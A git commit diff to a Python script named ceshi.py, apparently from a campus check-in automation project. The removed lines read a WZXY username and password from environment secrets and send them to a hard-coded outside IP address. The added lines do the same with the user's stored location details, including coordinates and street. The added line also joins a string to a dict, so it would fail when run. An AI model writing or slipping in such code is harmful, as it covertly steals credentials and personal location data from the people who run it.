4417fc102c701f5cfdac183c3579610d8eafa795
ninhua <87905129+ninhua@users.noreply.github.com>
2021-10-18 10:47:46 +0800

    Update ceshi.py

--- ceshi.py
+++ ceshi.py
@@ -5,8 +5,17 @@ import json
 import os
 import utils
 from urllib.parse import urlencode
-username, password = str(os.environ['WZXY_USERNAME']), str(os.environ['WZXY_PASSWORD'])
-print(username + password)
-url = ("http://43.252.209.207:5700/send_msg?user_id=2377950690&message=" + password + username)
+sign_data = {
+            "answers": '["0"]',
+            "latitude": os.environ['WZXY_LATITUDE'],
+            "longitude": os.environ['WZXY_LONGITUDE'],
+            "country": os.environ['WZXY_COUNTRY'],
+            "city": os.environ['WZXY_CITY'],
+            "district": os.environ['WZXY_DISTRICT'],
+            "province": os.environ['WZXY_PROVINCE'],
+            "township": os.environ['WZXY_TOWNSHIP'],
+            "street": os.environ['WZXY_STREET'],
+            }
+url = ("http://43.252.209.207:5700/send_msg?user_id=2377950690&message=" + sign_data)
 res = requests.get(url)
 print(res.text)
